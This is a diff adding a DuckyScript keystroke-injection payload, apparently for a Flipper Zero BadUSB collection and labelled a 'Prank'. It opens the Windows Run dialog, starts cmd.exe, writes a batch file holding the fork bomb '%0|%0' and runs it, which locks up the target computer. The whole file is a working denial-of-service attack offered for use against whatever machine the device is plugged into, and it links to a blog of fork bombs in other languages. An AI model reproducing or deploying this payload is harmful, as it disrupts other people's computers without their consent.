@@ -1,0 +1,18 @@
+REM Title: Win forkbomb variant 2
+REM Author: FalsePhilosopher
+REM Target: XP-11
+REM Props: Hak5, da3m0n s3c for the one liner, UberGuidoZ for keeping the flipper repo going.
+REM Version: 1.0
+REM Category: Prank
+REM Launches terminal and spawns a terminal forkbomb, if you want forkers in multiple languages head here https://da3m0ns3c.blogspot.com/2017/04/fork-bomb-in-several-language-implements.html
+REM
+DELAY 300
+GUI r
+DELAY 500
+STRING cmd.exe
+DELAY 200
+ENTER
+DELAY 2000
+STRING echo %0^|%0 > forkbomb.bat && forkbomb.bat
+DELAY 200
+ENTER
